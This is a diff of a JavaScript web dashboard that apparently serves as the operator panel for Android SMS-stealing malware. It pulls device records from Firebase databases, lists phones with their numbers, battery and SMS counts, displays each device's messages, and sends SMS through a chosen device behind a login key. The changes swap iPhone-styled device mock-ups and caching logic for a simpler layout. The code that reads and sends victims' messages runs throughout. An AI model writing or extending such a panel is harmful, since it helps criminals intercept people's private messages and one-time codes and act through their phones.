-    var meta=JSON.parse(localStorage.getItem(CLIENTS_CACHE_KEY)||'null');
-    if(!meta||!meta.byFb)return false;
-    var loaded=false;
-    Object.keys(meta.byFb).forEach(function(fbId){
-      var entry=meta.byFb[fbId];
-      if(!entry||!entry.data||(Date.now()-entry.ts)>=CLIENTS_CACHE_TTL)return;
-      Object.keys(entry.data).forEach(function(k){clientsRawMap[k]=entry.data[k];loaded=true;});
-    });
-    return loaded;
-  }catch(e){return false;}
-}
-function summaryFromParts(id,info,live,onlineStatus){
-  info=info||{};live=live||{};
-  var on=onlineStatus===true;
-  return{id:id,data:{
-    name:info.device_model||info.name||'Unknown',brand:info.device_brand||info.brand||'',
-    android:info.android_version||info.android||'',online:on,online_status:on,
-    battery:live.battery_level||live.battery||0,network:live.network_type||live.network||'?',
-    sms_count:live.total_sms||live.sms_count||0,mobNo:getPhoneFromRecord(info)||getPhoneFromRecord(live)
-  }};
-}
-function fetchOneDeviceSummary(inst,nodeName,id){
-  var base=inst.restUrl+'/'+nodeName+'/'+encodeURIComponent(id)+'/';
-  return Promise.all([restJson(base+'device_info.json'),restJson(base+'live_data.json'),restJson(base+'online_status.json')]).then(function(p){
-    var row=summaryFromParts(id,p[0],p[1],p[2]);
-    ingestDeviceData(inst.id,nodeName,row.id,row.data);
-  });
-}
-function fetchDevicesFast(inst,nodeName){
-  return restJson(inst.restUrl+'/'+nodeName+'.json?shallow=true').then(function(ids){
-    if(!ids||typeof ids!=='object')return;
-    var keys=Object.keys(ids);
-    if(!keys.length)return;
-    return Promise.all(keys.map(function(id){return fetchOneDeviceSummary(inst,nodeName,id);})).then(function(){processClientsData();});
-  });
-}
-function fetchSummaryNode(inst,node){
-  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){
-    if(!raw)return;
-    mergeSummaryNode(inst.id,node,raw);
-    processClientsData();
-  });
-}
-function fetchNodeViaSdk(inst,node){
-  if(!inst.db)return Promise.resolve();
-  return inst.db.ref(node).once('value').then(function(s){
-    if(!s.exists())return;
-    mergeSummaryNode(inst.id,node,s.val());
-    processClientsData();
-  });
-}
-function discoverViaSdk(inst){
-  if(!inst||!inst.db)return Promise.resolve(null);
-  var paths=['clients','devices','devices_status'];
-  return Promise.all(paths.map(function(p){
-    return inst.db.ref(p).limitToFirst(1).once('value').then(function(s){return s.exists()?p:null;}).catch(function(){return null;});
-  })).then(function(found){
-    found=found.filter(Boolean);
-    if(!found.length)return null;
-    var roots={};found.forEach(function(p){roots[p]=true;});
-    return roots;
-  });
-}
-function runDiscoveryTasks(inst,roots){
-  if(!roots||typeof roots!=='object')return Promise.resolve();
-  if(isFirebaseErr(roots)){inst.connError=String(roots.error);return Promise.resolve();}
-  inst.connError='';
-  var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0&&n!=='error';});
-  var tasks=[];
-  nodes.forEach(function(n){
-    if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
-    else if(n==='devices'||DEVICE_NODES.indexOf(n)>=0)tasks.push(fetchDevicesFast(inst,n));
-  });
-  if(!tasks.length)tasks.push(fetchNodeViaSdk(inst,'clients'),fetchNodeViaSdk(inst,'devices_status'));
-  return Promise.all(tasks);
-}
-function discoverAndFetchInstance(inst){
-  if(!inst)return Promise.resolve();
-  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
-    if(isFirebaseErr(roots)){
-      inst.connError=String(roots.error);
-      return discoverViaSdk(inst).then(function(sdkRoots){
-        if(sdkRoots)return runDiscoveryTasks(inst,sdkRoots);
-        return Promise.all([fetchNodeViaSdk(inst,'clients'),fetchNodeViaSdk(inst,'devices_status')]);
-      });
-    }
-    if(!roots||typeof roots!=='object'){
-      return discoverViaSdk(inst).then(function(sdkRoots){return runDiscoveryTasks(inst,sdkRoots||{});});
-    }
-    return runDiscoveryTasks(inst,roots);
-  }).catch(function(){
-    return discoverViaSdk(inst).then(function(sdkRoots){
-      if(sdkRoots)return runDiscoveryTasks(inst,sdkRoots);
-      return Promise.all([fetchNodeViaSdk(inst,'clients'),fetchNodeViaSdk(inst,'devices_status')]);
-    });
-  });
-}
-function attachLive(inst){
-  if(!inst.db||inst.liveAttached)return;
-  inst.liveAttached=true;
-  ['clients','devices_status'].forEach(function(node){
-    inst.db.ref(node).once('value').then(function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
-    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
-    inst.db.ref(node).on('child_added',function(s){ingestDeviceData(inst.id,node,s.key,s.val());processClientsData();});
-    inst.db.ref(node).on('child_changed',function(s){ingestDeviceData(inst.id,node,s.key,s.val());processClientsData();});
-  });
-}
-function attachRestPolling(inst){
-  if(inst.pollTimer)return;
-  var poll=function(){
-    if(inst.db){fetchNodeViaSdk(inst,'clients');fetchNodeViaSdk(inst,'devices_status');}
-    else{
-      restJson(inst.restUrl+'/clients.json').then(function(raw){if(raw){mergeSummaryNode(inst.id,'clients',raw);processClientsData();}});
-    }
-  };
-  poll();
-  inst.pollTimer=setInterval(poll,inst.schema==='rabel'?8000:12000);
 }
 function processClientsData(){
   allDevs=[];
@@ -639,98 +422,57 @@ function processClientsData(){
   if(!selDev&&allDevs.length)selDev=allDevs[0].id;
   renderDevices();updateStats();updateFbUi();
 }
-function bumpStat(id,val){
-  var el=document.getElementById(id);
-  if(!el||el.textContent===String(val))return;
-  el.textContent=val;el.classList.remove('bump');void el.offsetWidth;el.classList.add('bump');
-}
 function updateStats(){
   var l=getFilteredDevs();
-  var t=l.length,o=l.filter(function(d){return d.status==='online';}).length,f=l.filter(function(d){return d.status==='offline';}).length;
-  bumpStat('stTotal',t);bumpStat('stOnline',o);bumpStat('stOffline',f);
-  _lastStats={t:t,o:o,f:f};
+  document.getElementById('stTotal').textContent=l.length;
+  document.getElementById('stOnline').textContent=l.filter(function(d){return d.status==='online';}).length;
+  document.getElementById('stOffline').textContent=l.filter(function(d){return d.status==='offline';}).length;
+}
+function fetchSummaryNode(inst,node){
+  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
+}
+function discoverInstance(inst){
+  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
+    if(!roots||typeof roots!=='object')return;
+    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
+    var tasks=[];
+    nodes.forEach(function(n){
+      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
+      else if(n==='devices')tasks.push(fetchSummaryNode(inst,n));
+    });
+    return Promise.all(tasks);
+  });
+}
+function attachLive(inst){
+  if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
+  ['clients','devices_status'].forEach(function(node){
+    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
+  });
 }
 function fetchAllData(){
-  var inst=getFbInstance(activeFbId);
-  if(!inst){toast('No Firebase selected',false);return Promise.resolve();}
   document.getElementById('hdrSub').textContent='Syncing...';
-  var hadCache=loadAllCaches();
-  if(hadCache)processClientsData();
-  firebaseInstances.forEach(function(i){if(i.pollTimer){clearInterval(i.pollTimer);i.pollTimer=null;}});
-  if(!inst.liveAttached){attachLive(inst);attachRestPolling(inst);}
-  return discoverAndFetchInstance(inst).then(function(){
+  firebaseInstances.forEach(attachLive);
+  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
     processClientsData();
-    var cnt=getFilteredDevs().length;
-    var err=inst.connError;
-    document.getElementById('hdrSub').textContent=cnt?cnt+' devices · '+inst.name:(err?'Error · '+inst.name:inst.name);
-    if(!cnt&&err)toast('Firebase: '+err,false);
+    document.getElementById('hdrSub').textContent=getFilteredDevs().length+' devices';
     if(selDev)loadSmsForDevice();
   });
 }
-var IOS_COLORS=['c-blue','c-purple','c-titanium','c-gold','c-red'];
-var IOS_MODELS=['iPhone 15 Pro','iPhone 14','iPhone 15','iPhone 13 Pro Max','iPhone 16 Pro'];
-var _lastStats={t:0,o:0,f:0},_tabOrder=['home','device','sms','send','more'];
-
-function iosColor(i){return IOS_COLORS[(i||0)%IOS_COLORS.length];}
-function iosModel(d,i){
-  var n=(d.name||'').toLowerCase();
-  if(/iphone|ios|apple/i.test(n)||/iphone|apple/i.test(d.brand||''))return d.name||'iPhone';
-  return IOS_MODELS[(i||0)%IOS_MODELS.length];
-}
-function iosTime(){var t=new Date();return t.getHours()+':'+String(t.getMinutes()).padStart(2,'0');}
-function iosBatteryHtml(pct,large){
-  var low=pct<20?' low':'';
-  return '<div class="ios-bat-mini'+low+'"><span style="width:'+Math.max(4,Math.min(100,pct))+'%"></span></div>';
-}
-function iosSignalHtml(){
-  return '<div class="ios-sig"><i></i><i></i><i></i></div>';
-}
-function iphoneShellHtml(d,i,large){
-  var col=iosColor(i),on=d.status==='online';
-  var shellCls='iphone-shell '+col+(large&&on?' online':'');
-  return '<div class="'+shellCls+'">'+
-    '<div class="iphone-screen">'+
-    '<div class="iphone-island"></div>'+
-    '<div class="ios-status-top"><span class="ios-time">'+iosTime()+'</span>'+
-    '<div class="ios-status-icons">'+iosSignalHtml()+iosBatteryHtml(d.battery||0,large)+'</div></div>'+
-    '<div class="ios-lock-icon">🔒</div>'+
-    '<div class="ios-screen-phone">'+esc(d.displayPhone)+'</div>'+
-    '<div class="ios-screen-model">'+esc(iosModel(d,i))+'</div>'+
-    '<div class="ios-home-bar"></div>'+
-  '<div class="ios-online-pip"></div></div></div>';
-}
-
-function refreshData(){
-  var btn=document.getElementById('refreshBtn');
-  if(btn){btn.classList.add('spinning');setTimeout(function(){btn.classList.remove('spinning');},800);}
-  toast('Refreshing...',true);fetchAllData();
-}
+function refreshData(){toast('Refreshing...',true);fetchAllData();}
 
 function renderDevices(){
   var q=(document.getElementById('devSearch').value||'').toLowerCase();
   var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
   var el=document.getElementById('devList');
-  if(!list.length){
-    var inst=getFbInstance(activeFbId);
-    var err=inst&&inst.connError?('<br><span style="font-size:10px;color:var(--error);margin-top:8px;display:block">'+esc(inst.connError)+'</span>'):'';
-    el.innerHTML='<div class="empty-state"><div class="ico">📱</div>No devices on '+(inst?esc(inst.name):'Firebase')+'<br><span style="font-size:11px;opacity:.6">Tap ↻ refresh · check Firebase switcher</span>'+err+'</div>';
-    return;
-  }
-  window._devList=list;
-  el.innerHTML=list.map(function(d,i){
-    var delay=Math.min(i*0.06,0.4);
-    return '<div class="ios-row '+d.status+(d.id===selDev?' active':'')+'" style="animation-delay:'+delay+'s" data-idx="'+i+'" onclick="selectDeviceIdx('+i+')">'+
-      iphoneShellHtml(d,i,false)+
-      '<div class="ios-info">'+
-      '<div class="ios-info-phone">'+esc(d.displayPhone)+'</div>'+
-      '<div class="ios-info-model"><em>'+esc(iosModel(d,i))+'</em> · '+esc(d.name)+'</div>'+
-      '<div class="ios-chips"><span class="chip ios">iOS</span><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
+  if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📡</div>No devices yet<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';return;}
+  el.innerHTML=list.map(function(d){
+    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
+      '<div class="dev-bar"></div><div class="dev-body">'+
+      '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
+      '<div class="dev-meta">'+esc(d.name)+' · '+esc(d.rawId.substring(0,14))+'</div>'+
+      '<div class="dev-chips"><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
       '</div></div>';
   }).join('');
-}
-function selectDeviceIdx(i){
-  var d=window._devList&&window._devList[i];
-  if(d)selectDevice(d.id);
 }
 function selectDevice(id){
   selDev=id;renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice();
@@ -741,17 +483,16 @@ function renderDeviceView(){
   var d=getSelDev(),empty=document.getElementById('deviceEmpty'),hero=document.getElementById('deviceHero');
   if(!d){empty.classList.remove('hidden');hero.classList.add('hidden');return;}
   empty.classList.add('hidden');hero.classList.remove('hidden');
-  var idx=window._devList?window._devList.findIndex(function(x){return x.id===d.id;}):0;
-  if(idx<0)idx=0;
-  hero.innerHTML='<div class="hero-wrap">'+
-    '<div class="hero-badge-wrap"><span class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</span></div>'+
-    '<div class="hero-iphone">'+iphoneShellHtml(d,idx,true)+'</div>'+
-    '<div class="hero-stats">'+
+  hero.innerHTML='<div class="hero-card">'+
+    '<div class="hero-phone">'+esc(d.displayPhone)+'</div>'+
+    '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+'</div>'+
+    '<div class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</div>'+
+    '<div class="hero-grid">'+
     '<div class="hero-cell"><div class="hero-lbl">BATTERY</div><div class="hero-val">'+d.battery+'%</div></div>'+
     '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
-    '<div class="hero-cell"><div class="hero-lbl">DEVICE</div><div class="hero-val">'+esc(iosModel(d,idx))+'</div></div>'+
+    '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
     '<div class="hero-cell"><div class="hero-lbl">SMS</div><div class="hero-val">'+d.smsCount+'</div></div>'+
-    '</div><div class="hero-uid">'+esc(d.rawId)+'</div></div>';
+    '</div><div style="margin-top:12px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
 }
 function updateSendForm(){
   var d=getSelDev();
@@ -810,11 +551,10 @@ function renderSms(){
   var d=getSelDev(),el=document.getElementById('smsList');
   if(!d){document.getElementById('smsEmpty').classList.remove('hidden');el.innerHTML='';return;}
   if(!window_sms.length){el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';return;}
-  el.innerHTML=window_sms.map(function(s,i){
+  el.innerHTML=window_sms.map(function(s){
     var out=s.type==='sent'||s.type==='outbox';
-    var delay=Math.min(i*0.04,0.5);
-    return '<div class="sms-bubble '+(out?'out':'in')+'" style="animation-delay:'+delay+'s">'+
-      '<div class="sms-from">'+esc(s.address)+'</div>'+
+    return '<div class="sms-bubble '+(out?'out':'in')+'">'+
+      '<div class="sms-from">'+esc(s.address)+(out?'':'')+'</div>'+
       esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
   }).join('');
 }
@@ -833,16 +573,9 @@ function sendSms(){
   }).catch(function(){document.getElementById('sendStatus').textContent='❌ Error';toast('Network error',false);});
 }
 
-var _currentTab='home';
 function switchTab(name,btn){
-  var prevIdx=_tabOrder.indexOf(_currentTab),nextIdx=_tabOrder.indexOf(name);
-  document.querySelectorAll('.screen').forEach(function(s){
-    s.classList.remove('active','slide-back');
-    if(s.id==='screen-'+_currentTab&&nextIdx<prevIdx)s.classList.add('slide-back');
-  });
-  var screen=document.getElementById('screen-'+name);
-  screen.classList.add('active');
-  _currentTab=name;
+  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
+  document.getElementById('screen-'+name).classList.add('active');
   document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
   if(btn)btn.classList.add('active');
   if(name==='sms'&&selDev)loadSmsForDevice();
@@ -861,7 +594,7 @@ function unlockApp(token,exp,remember){
   if(remember)localStorage.setItem('rbl_session',JSON.stringify(s));else sessionStorage.setItem('rbl_session',JSON.stringify(s));
   document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('appShell').classList.remove('hidden');
-  if(!panelReady){panelReady=true;fetchAllData();loadAutoTokenState();setInterval(function(){document.querySelectorAll('.ios-time').forEach(function(el){el.textContent=iosTime();});},30000);}
+  if(!panelReady){panelReady=true;fetchAllData();loadAutoTokenState();}
 }
 function doLogin(){
   var key=(document.getElementById('loginKey').value||'').trim().toUpperCase();
